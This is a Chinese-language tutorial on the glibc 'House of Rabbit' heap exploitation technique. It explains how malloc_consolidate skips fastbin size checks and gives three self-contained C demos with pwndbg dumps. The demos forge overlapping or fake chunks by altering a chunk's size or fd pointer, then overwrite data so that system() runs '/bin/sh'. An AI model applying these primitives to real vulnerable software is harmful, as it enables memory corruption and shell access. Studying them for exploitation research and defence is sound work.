# House Of Rabbit

## 原理

[参考链接](http://blog.eonew.cn/archives/676)

fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用在 malloc consolidate 的时候对 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。

在malloc一个很大的chunk时，glibc会试图将fastbin的chunk进行合并,在合并时，先检查下一个chunk是不是top chunk，如果是则直接合并，如果不是还要检查下一个chunk是否使用,如果不在使用状态的话，则进行合并然后更新size，放到unsorted bin中

### 前提条件

1. 可以修改 fastbin 的 fd 指针或 size
2. 可以触发 malloc consolidate(merge top 或 malloc big chunk 等等)

### 攻击过程

通过修改 fastbin chunk 的 size 直接构造 overlap chunk，或者修改 fd，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk

#### 正常情况

```c++
#include <stdlib.h>
#include <string.h>

int main()
{
    char *chunk1, *chunk2;
    chunk1 = malloc(24);
    chunk2 = malloc(24);
    malloc(0x10); // 防止与top chunk合并
    free(chunk1);
    free(chunk2);
    // pwndbg> telescope 0x602000 100
    // 00:0000│ rax rdx  0x602000 ◂— 0x0
    // 01:0008│          0x602008 ◂— 0x21 /* '!' */ <-- chunk1(fast bin)
    // 02:0010│          0x602010 ◂— 0x0
    // ... ↓
    // 05:0028│          0x602028 ◂— 0x21 /* '!' */
    // 06:0030│ r8       0x602030 —▸ 0x602000 ◂— 0x0 <-- chunk2(fast bin)
    // 07:0038│          0x602038 ◂— 0x0
    // ... ↓
    // 09:0048│          0x602048 ◂— 0x21 /* '!' */
    // 0a:0050│          0x602050 ◂— 0x0
    // ... ↓
    // 0d:0068│          0x602068 ◂— 0x20fa1 <-- top chunk
    // 0e:0070│          0x602070 ◂— 0x0
    // ... ↓


    // allocate a large chunk, trigger malloc consolidate
    // 申请一块大chunk，即可触发使得两块chunk合并
    malloc(0x1000);
    // pwndbg> small
    // smallbins
    // 0x40: 0x602000 —▸ 0x7ffff7dd1ba8 (main_arena+136) ◂— 0x602000
    // pwndbg> telescope 0x602000 100
    // 00:0000│          0x602000 ◂— 0x0
    // 01:0008│          0x602008 ◂— 0x41 /* 'A' */ <-- chunk1 size was changed
    // 02:0010│          0x602010 —▸ 0x7ffff7dd1ba8 (main_arena+136) —▸ 0x7ffff7dd1b98 (main_arena+120) —▸ 0x7ffff7dd1b88 (main_arena+104) —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— ...
    // ... ↓
    // 04:0020│          0x602020 ◂— 0x0
    // 05:0028│          0x602028 ◂— 0x21 /* '!' */
    // 06:0030│          0x602030 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603070 ◂— 0x0
    // ... ↓
    // 08:0040│          0x602040 ◂— 0x40 /* '@' */
    // 09:0048│          0x602048 ◂— 0x20 /* ' ' */
    // 0a:0050│          0x602050 ◂— 0x0
    // ... ↓
    // 0d:0068│          0x602068 ◂— 0x1011
    // 0e:0070│ rax rdx  0x602070 ◂— 0x0
    // ... ↓
    // pwndbg>

    return 0;
}
```

chunk1 和 chunk2 合并成一个size为0x40的chunk

当chunk的size可控时，可以将size直接设置为0x40，则下次check的nextchunk的时候，就会检查到chunk是在使用状态，而不会进行合并。这样在unsorted Bin中就有两个chunk，而且大的chunk包含着小的chunk。

#### 修改size

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    char *controllable_chunk, *temp, *ptr, *sh, *payload;
    controllable_chunk = malloc(24); //size: 0x20
    temp = malloc(24);               //size: 0x20
    malloc(0x10);                    // 防止与top chunk合并

    free(controllable_chunk);
    free(temp);
    // pwndbg> heapinfo
    // (0x20)     fastbin[0]: 0x602020 --> 0x602000 --> 0x0
    // (0x30)     fastbin[1]: 0x0
    // (0x40)     fastbin[2]: 0x0
    // (0x50)     fastbin[3]: 0x0
    // (0x60)     fastbin[4]: 0x0
    // (0x70)     fastbin[5]: 0x0
    // (0x80)     fastbin[6]: 0x0
    // (0x90)     fastbin[7]: 0x0
    // (0xa0)     fastbin[8]: 0x0
    // (0xb0)     fastbin[9]: 0x0
    //                 top: 0x602060 (size : 0x20fa0)
    //     last_remainder: 0x0 (size : 0x0)
    //             unsortbin: 0x0


    // controllable_chunk->size = 0x41
    *(long *)(controllable_chunk - 8) = 0x41;
    // pwndbg> telescope 0x602000 100
    // 00:0000│ rdx  0x602000 ◂— 0x0
    // 01:0008│ rax  0x602008 ◂— 0x41 /* 'A' */
    // 02:0010│      0x602010 ◂— 0x0
    // ... ↓
    // 05:0028│      0x602028 ◂— 0x21 /* '!' */
    // 06:0030│ r8   0x602030 —▸ 0x602000 ◂— 0x0
    // 07:0038│      0x602038 ◂— 0x0
    // ... ↓
    // 09:0048│      0x602048 ◂— 0x21 /* '!' */
    // 0a:0050│      0x602050 ◂— 0x0
    // ... ↓
    // 0d:0068│      0x602068 ◂— 0x20fa1
    // 0e:0070│      0x602070 ◂— 0x0
    // ... ↓
    // pwndbg>

    // allocate a large chunk, trigger malloc consolidate
    // 申请一块大chunk，即可触发使得两块chunk合并
    malloc(0x1000);
    // pwndbg> bin
    // fastbins
    // 0x20: 0x0
    // 0x30: 0x0
    // 0x40: 0x0
    // 0x50: 0x0
    // 0x60: 0x0
    // 0x70: 0x0
    // 0x80: 0x0
    // unsortedbin
    // all: 0x0
    // smallbins
    // 0x20: 0x602020 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602020 /* '  `' */
    // 0x40: 0x602000 —▸ 0x7ffff7dd1ba8 (main_arena+136) ◂— 0x602000
    // largebins
    // empty


    sh = malloc(24);
    strncpy(sh, "id", 24 - 1);
    // pwndbg> x/32g 0x602000
    // 0x602000:    0x0000000000000000  0x0000000000000041
    // 0x602010:    0x00007ffff7dd1ba8  0x00007ffff7dd1ba8
    // 0x602020:    0x0000000000000000  0x0000000000000021
    // 0x602030:    0x0000000000006469  0x0000000000000000
    // 0x602040:    0x0000000000000000  0x0000000000000021
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000000  0x0000000000001011
    // allocate a new chunk, glibc will give us the old temp's location(we jsut free it)

    ptr = malloc(0x40 - 8);
    // pwndbg> x/x ptr
    // 0x602010:    0x00007ffff7dd1ba8
    // now we get a chunk which point to the old controllable_chunk(after malloc(0x40-8))
    payload = "aaaaaaaaaaaaaaaa" // 16
              "aaaaaaaaaaaaaaaa" // 16
              "/bin/sh";
    // padding to sh's content
    strncpy(ptr, payload, 0x40 - 8 - 1);
    // pwndbg> x/16g ptr
    // 0x602010:    0x6161616161616161  0x6161616161616161
    // 0x602020:    0x6161616161616161  0x6161616161616161
    // 0x602030:    0x0068732f6e69622f  0x0000000000000000
    // 0x602040:    0x0000000000000000  0x0000000000000021
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000000  0x0000000000001011
    // 0x602070:    0x0000000000000000  0x0000000000000000
    // 0x602080:    0x0000000000000000  0x0000000000000000
    system(sh);
    return 0;
}
```

#### 修改chunkd的fd指针

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    char *controllable_chunk, *sh, *payload;
    long long *ptr;
    controllable_chunk = malloc(24); //size: 0x20
    ptr = malloc(0x100);             //size: 0x110
    malloc(0x10);                    // 防止与top chunk合并
    // pwndbg> telescope 0x602000 100
    // 00:0000│ r8       0x602000 ◂— 0x0
    // 01:0008│          0x602008 ◂— 0x21 /* '!' */
    // 02:0010│          0x602010 ◂— 0x0
    // ... ↓
    // 05:0028│          0x602028 ◂— 0x111
    // 06:0030│          0x602030 ◂— 0x0
    // ... ↓
    // 27:0138│          0x602138 ◂— 0x21 /* '!' */
    // 28:0140│ rax rdx  0x602140 ◂— 0x0
    // ... ↓
    // 2b:0158│          0x602158 ◂— 0x20eb1
    // 2c:0160│          0x602160 ◂— 0x0
    // ... ↓

    ptr[1] = 0x31;  //fake chunk size 0x30
    ptr[7] = 0x21;  //fake chunk's next chunk
    ptr[11] = 0x21; //fake chunk's next chunk's next chuck
    // pwndbg> x/26g ptr
    // 0x602030:    0x0000000000000000  0x0000000000000031
    // 0x602040:    0x0000000000000000  0x0000000000000000
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000000  0x0000000000000021
    // 0x602070:    0x0000000000000000  0x0000000000000000
    // 0x602080:    0x0000000000000000  0x0000000000000021

    free(controllable_chunk);
    //  modify the fd of chunk1
    *(void **)controllable_chunk = ptr;
    // pwndbg> x/16g controllable_chunk
    // 0x602010:    0x0000000000602030  0x0000000000000000 <-- rewrite the chunk's fd
    // 0x602020:    0x0000000000000000  0x0000000000000111
    // 0x602030:    0x0000000000000000  0x0000000000000031
    // 0x602040:    0x0000000000000000  0x0000000000000000
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000000  0x0000000000000021
    // 0x602070:    0x0000000000000000  0x0000000000000000
    // 0x602080:    0x0000000000000000  0x0000000000000021
    // pwndbg> fast
    // fastbins
    // 0x20: 0x602000 —▸ 0x602030 ◂— 0x0
    // 0x30: 0x0
    // 0x40: 0x0
    // 0x50: 0x0
    // 0x60: 0x0
    // 0x70: 0x0
    // 0x80: 0x0

    // allocate a large chunk, trigger malloc consolidate
    // 申请一块大chunk，即可触发使得两块chunk合并

    malloc(0x1000);
    // pwndbg> small
    // smallbins
    // 0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
    // 0x30: 0x602030 —▸ 0x7ffff7dd1b98 (main_arena+120) ◂— 0x602030 /* '0 `' */
    // pwndbg> x/16g 0x602000
    // 0x602000:    0x0000000000000000  0x0000000000000021
    // 0x602010:    0x00007ffff7dd1b88  0x00007ffff7dd1b88
    // 0x602020:    0x0000000000000020  0x0000000000000110
    // 0x602030:    0x0000000000000000  0x0000000000000031
    // 0x602040:    0x00007ffff7dd1b98  0x00007ffff7dd1b98
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000030  0x0000000000000020
    // 0x602070:    0x0000000000000000  0x0000000000000000
    // old controllable_chunk combine with old ptr
    sh = malloc(0x30 - 8);
    // pwndbg> x/x sh
    // 0x602040:    0x00007ffff7dd1b98
    // pwndbg> x/x ptr
    // 0x602030:    0x0000000000000000
    strncpy(sh, "id", 0x30 - 8 - 1);

    payload = "aaaaaaaaaaaaaaaa" // 16
              "/bin/sh";
    // padding to sh
    strncpy((char *)ptr, payload, 0x100 - 1);
    // pwndbg> x/8g ptr
    // 0x602030:    0x6161616161616161  0x6161616161616161
    // 0x602040:    0x0068732f6e69622f  0x0000000000000000
    // 0x602050:    0x0000000000000000  0x0000000000000000
    // 0x602060:    0x0000000000000000  0x0000000000000000
    // pwndbg>

    system(sh);
    return 0;
}
```
